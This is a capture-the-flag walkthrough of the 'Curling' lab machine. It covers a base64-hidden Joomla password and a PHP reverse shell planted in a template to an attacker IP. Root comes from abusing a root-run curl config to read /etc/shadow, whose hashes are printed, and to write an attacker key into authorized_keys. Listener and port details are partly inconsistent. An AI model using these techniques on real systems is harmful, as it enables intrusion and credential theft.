Curling is an easy-difficulty Linux box. The great thing about Curling is all of the small, simple steps that are required to complete it. The machine includes a website built by a content management system (CMS) called Joomla. The administrator of the website, Floris (who, judging by the content of the website is a devoted [curling](https://en.wikipedia.org/wiki/Curling) enthusiast), thought they were being tricky hiding important base64-encoded information in HTML code. Once this secret information has been leveraged to access the machine as the `floris` user, the hobby that Floris loves most (namely, [cURLing](https://en.wikipedia.org/wiki/CURL)) results in their timely demise...

*Note: I completed this challenge on December 19th, 2018, however I'm just now writing it up in December 2019. As such, some of the details are sparse.*

## User
To begin enumeration, the `masscan` tool was used to scan the target system for open ports. 

```
root@kali:~/workspace/hackthebox/Curling# masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.150

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-22 15:32:02 GMT

Discovered open port 80/tcp on 10.10.10.150    
```

This scan revealed that TCP ports 22(SSH) and and 80(HTTP) were open and listening for connections. Taking these open ports, the `nmap` tool was then used to further enumerate the open ports.

```
root@kali:~/workspace/hackthebox/Curling# nmap -p 22,80 -sC -sV -oA scans/discovered-tcp 10.10.10.150

```

As expected, port 22 is listening for connection as a SSH server and port 80 is acting as the webserver HTTP port.

Browsing to the HTTP service at `http://10.10.10.150` confirms the website's presence. The home page contains some information about the sport of curling as well as a login form.

![curling_home.png](/assets/images/htb/curling/curling_home.png)

Before poking around with the website, a `gobuster` scan was initiated with the goal of discovering website directories.

```
root@kali:~/workspace/hackthebox/Curling# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.150
```

As the scan was running, the HTML source code of the homepage was inspected. The meta tags confirm that this website is using the "Joomla!" content management system.

![html_source1.png](/assets/images/htb/curling/html_source1.png)

In addition, the last three lines of HTML include a comment that reference a `secret.txt` file.

![html_source2.png](/assets/images/htb/curling/html_source2.png)

Browsing to `http://10.10.10.150/secret.txt` reveals the following text:

```
Q3VybGluZzIwMTgh
```

From the home page, it appears that the informational posts have been written by the "Super User" user and are signed with "-Floris", suggesting that Floris may be an administrator of this website.

![post_example.png](/assets/images/htb/curling/post_example.png)

Using the string from `secret.txt` as a password and usernames such as "admin", "administrator", and "floris", attempts were made to log in using the login form on the home page, but to no avail.

Further examining the text within the `secret.txt` file suggests that it could be a base64 encoded string. To test this theory, the `Q3VybGluZzIwMTgh` string was saved to a local `secret.txt` file on the attacking system and was then base64 decoded, revealing the `Curling2018!` string.

```
root@kali:~/workspace/hackthebox/Curling# base64 -d secret.txt 
Curling2018!
```

The username/password combination of `floris` / `Curling2018!` can be used to log in to the website. Posts can be made and the website can be modified, however this doesn't appear to provide much of advantage.

Looking at the results of the now complete `gobuster` scan, a variety of directories were returned.

```
/images (Status: 301)
/templates (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/bin (Status: 301)
/plugins (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/components (Status: 301)
/cache (Status: 301)

/tmp (Status: 301)
/layouts (Status: 301)
/administrator (Status: 301)
/cli (Status: 301)
/server-status (Status: 403)
```

As the `/administrator` directory sounds lucrative, the directory was visited which reveals a "Joomla!" login page.

![joomla_login.png](/assets/images/htb/curling/joomla_login.png)

Using the same credentials as before (`floris` / `Curling2018!`), the Joomla! administrator console can be accessed. From this console, there are a lot of possibilities. For example, users can be edited, templates can be modified, and extensions can be installed.

![joomla_tour.gif](/assets/images/htb/curling/joomla_tour.gif)

From the sidebar under the "Configuration" header is the option to edit templates. Navigating to this page shows that the default "protostar" template is currently in use.

![protostar_default.png](/assets/images/htb/curling/protostar_default.png)

Clicking on the "Protostar" link under the "Template" column shown in the image above directs to a page that allows for the files included in the template to be edited. Also, this page shows that the templates include PHP files. 

Checking out the `index.php` file confirms that this file builds the home page present at `http://10.10.10.150`, as the last three lines of contain the same reference to `secret.txt` as found in the HTML source code previously.

![edit_index1.png](/assets/images/htb/curling/edit_index1.png)

The `index.php` file was next edited to include the code shown below:

```
echo exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/1234 0>&1'");
```

This was placed in the `index.php` file as represented in the following screenshot.

![snarky_shell.png](/assets/images/htb/curling/snarky_shell.png)

After saving the changes and starting a `nc` listener on the attacking machine (`nc -lp 4444` will do the trick), browsing to the `http://10.10.10.150` URL results in a reverse shell on the target system as the `www-data` user.

![wwwdata_shell.png](/assets/images/htb/curling/wwwdata_shell.png)

The shell was upgraded using `python3 -c 'import pty;pty.spawn("/bin/bash")'` before moving on. This process can be accomplished by completing the following steps:
<a id="shell_upgrade"><a>
1. On the target system, run `python3 -c 'import pty;pty.spawn("/bin/bash")'`
2. Issue the `^Z` signal (`Ctrl` + `z`)
3. On the attacking system, run `stty raw -echo; fg`
4. Issue the `^C` signal (`Ctrl` + `c`)

This is demonstrated in full within the text below.

```
www-data@curling:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@curling:/var/www/html$ ^Z
[1]+  Stopped                 nc -lp 4444
root@kali:~/workspace/hackthebox/Curling# stty raw -echo; fg
nc -lp 4444
           ^C
www-data@curling:/var/www/html$ 
```

As the `www-data` user, the `user.txt` flag cannot be read as it is owned by the user `floris`. In the `floris`  user's home directory, however, there is a world-readable file called `password_backup` that contains what appears to be the result of an `xxd` command.

```

```

Before working with this file further, it was transferred to the attacking system using `scp`.

```
www-data@curling:/home/floris$ scp ./password_backup root@10.10.14.2:/root/workspace/hackthebox/Curling/
```

From `xxd -h`, the `-r` flag can be used to reverse an operation. Running the `xxd -r password_backup > output` command creates the `output` file that contains the reuslt of the `xxd -r` command. The `file` tool was used to determine what kind of data is within the file.

```
root@kali:~/workspace/hackthebox/Curling# file output 
output: bzip2 compressed data, block size = 900k
```

The command `bunzip2 output` can be used to decompress the `output` file. This results in the `output.out` file, which is of a different file type.

```
root@kali:~/workspace/hackthebox/Curling# file output.out 
output.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141
```

The `output.out` file should be renamed to `output_1.gz` before being decompressed with `gunzip`. 

```
root@kali:~/workspace/hackthebox/Curling# mv output.out output_1.gz && gunzip output_1.gz
```

This results in the `output_1` file which is another `bzip2` compressed file. The `bunzip2` command is used once again.

```
root@kali:~/workspace/hackthebox/Curling# bunzip2 output_1
```

The resulting file `output_1.out` is a POSIX tar archive.

```
root@kali:~/workspace/hackthebox/Curling# file output_1.out 
output_1.out: POSIX tar archive (GNU)
```

The contents of this archive can be extracted with the `tar`.

```
root@kali:~/workspace/hackthebox/Curling# tar -xvf output_1.out
```

This results in the `password.txt` file being extracted from the archive. The contents of this file contains the password for the `floris` user.

```
root@kali:~/workspace/hackthebox/Curling# cat password.txt
5d<wdCbdZu)|hChXll
```

This password can be used to access the target system using SSH. From this position, the `user.txt` flag file can be read.

```
floris@curling:~$ cat user.txt
65dd1df0<redacted>
```

## Root
The path to privilege escalation can be seen in the output of the `ps waux | grep root` command. This command shows the processes on the system that are running as the `root` user.

From the output of the `ps waux | grep root` command, there is a process running as root that is issuing the `curl` command shown below:

```
/bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```

From the output of `curl --help | grep '\-K'`, it can be seen that the command is using the `/home/floris/admin-area/input` file as a configuration file.

```
floris@curling:~/admin-area$ curl --help | grep '\-K'
 -K, --config <file> Read config from a file
```

The result of this `curl` command is then being written to the `/home/floris/admin-area/report` file as specified with the `-o` flag.

While the `root` user is the owner of the `input` and `report` files, users in the `floris` group are able to read and write to the these files.

```
-rw-rw---- 1 root   floris   25 Dec 22 17:54 input
-rw-rw---- 1 root   floris  14K Dec 22 17:54 report
```

Examining the `input` file reveals that the curl command is directed towards the `http://127.0.0.1` URL -- the address of `localhost`.

```
floris@curling:~/admin-area$ cat input 
url = "http://127.0.0.1"
```

Changing the contents of the `input` file to the text shown below results in the contents of the `/etc/shadow` being written to the `report` file.

```
url = "file:///etc/shadow"
```

The `/etc/shadow` file contains hashed passwords for system users, including the password hash for the `root` user. After a few seconds, the contents of the `report` file will be overwritten with the contents of `/etc/shadow`. The output below is a truncated version of the target system's `/etc/shadow` file.

```
floris@curling:~/admin-area$ cat report
root:$6$RIgrVboA$HDaB29xvtkw6U/Mzq4qOHH2KHB1kIR0ezFyjL75DszasVFwznrsWcc1Tu5E2K4FA7/Nv8oje0c.bljjnn6FMF1:17673:0:99999:7:::
daemon:*:17647:0:99999:7:::
...
sshd:*:17647:0:99999:7:::
floris:$6$yl7KKyGaOhVExlCb$ONJceChbI7srpLlJ/AhCLgESU7E4gXexPVgsJMjvQ0hP.6fwslfwWmD15cuaYs9./Jin4e/4LURPgEBav4iv//:17673:0:99999:7:::
mysql:!:17673:0:99999:7:::
```

The password hash the `root` user can be copied to a file on the attacking system. Then, `hashcat` can be used to attempt to crack the password hash.

```
root@kali:~/workspace/hackthebox/Curling# cat root-hash.txt 
$6$RIgrVboA$HDaB29xvtkw6U/Mzq4qOHH2KHB1kIR0ezFyjL75DszasVFwznrsWcc1Tu5E2K4FA7/Nv8oje0c.bljjnn6FMF1
```

Since the hash begins with `$6`, this suggests that the hash is a `sha512crypt`.

```
root@kali:~/workspace/hackthebox/Curling# hashcat -h | grep sha512crypt
   1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating Systems
```

The `hashcat` command that was used in attempt to crack the password hash is shown below. Note that the password was not cracked.

```
root@kali:~/workspace/hackthebox/Curling# hashcat -m 1800 root-hash.txt /usr/share/wordlists/rockyou.txt --force
```

As the password hash was not cracked by the `hashcat` command above, an alternative privelege escalation method was required.

Looking further into the `curl` configuration file `-K` flag, it appears that additional arguments can be set from within the configuration file. From `man curl`, an example is given.

```
# --- Example file ---
# this is a comment
url = "example.com"
output = "curlhere.html"
user-agent = "superagent/1.0"

# and fetch another URL too
url = "example.com/docs/manpage.html"
-O
referer = "http://nowhereatall.example.com/"
# --- End of example file ---
```

From this, it appears that the `output` variable can be set within a configuration file to specify where the output of the `curl` command should be written. 

From here, the `input` file that acts as a configuration file for `curl` when run on the target system was changed as represented below.

```
url = "http://10.10.14.2/id_rsa.pub"
output = "/root/.ssh/authorized_keys"
```

After serving the SSH public key `id_rsa.pub` on the attacking system using `python -m SimpleHTTPServer 80`, the target system writes the contents of the attacking system's public SSH key to the target system's `/root/.ssh/authorized_keys` directory which allows the attacking system to SSH to the target system as `root`.

This process is shown below. The loop demonstrates starting Python's SimpleHTTPServer on the attacking system, editing the `input` file on the target system to interact with the attacking system, the target system requesting the attacking system's `id_rsa.pub` file, and finally accessing the target system as `root` over SSH. Note that the duration of one loop is ~30 seconds.

![root_pwn.gif](/assets/images/htb/curling/root_pwn.gif)

The `root.txt` flag can now be read.

```
root@curling:~# cat root.txt 
82c198ab<redacted>
```
